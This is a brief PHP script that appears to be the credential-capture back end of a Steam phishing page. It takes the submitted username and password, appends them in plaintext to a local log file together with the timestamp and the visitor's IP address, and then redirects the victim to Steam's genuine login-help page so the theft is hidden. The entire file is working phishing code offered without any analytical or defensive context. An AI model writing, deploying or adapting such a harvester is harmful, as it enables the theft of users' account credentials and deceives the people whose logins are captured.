<?php

$user = $_POST['username'];
$pass = $_POST['password'];
$time = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];

$logData = "$time | $ip | username: $user | password: $pass";

$logFile = 'log.txt';
$file = fopen($logFile,'a');
fwrite($file, $logData);
fclose($file);

header('Location: https://help.steampowered.com/en/wizard/HelpWithLoginInfo/');
exit();
?>